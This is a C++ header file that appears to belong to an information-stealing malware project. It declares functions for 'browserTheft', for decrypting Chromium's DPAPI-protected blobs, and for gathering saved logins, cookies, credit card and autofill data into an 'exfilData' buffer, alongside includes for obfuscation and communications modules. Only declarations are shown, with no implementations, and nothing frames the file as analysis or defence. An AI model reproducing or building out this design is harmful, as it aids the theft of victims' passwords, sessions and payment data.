#pragma once
#include "vars.h"
#include "functions.h"
#include "utils.h"
#include "comms.h"
#include "obfuscation.h"

int browserTheft();
int extractChromiumData(vector<char>& exfilData);

vector<unsigned char> decryptChromiumBrowserBlob(vector<char> blob, DATA_BLOB keyBlob);
int createChromiumDBCopies(wstring installDir);
int resolveSqliteFunctions(HMODULE& hSqlite3);
DATA_BLOB getDPAPIKeyBlob(wstring installDir);
int getChromiumLoginData(vector<char>& exfilData, DATA_BLOB keyBlob);
int getChromiumCookies(vector<char>& exfilData, DATA_BLOB keyBlob);
int getChromiumCreditCardData(vector<char>& exfilData, DATA_BLOB keyBlob);
int getChromiumAutofillData(vector<char>& exfilData, DATA_BLOB keyBlob);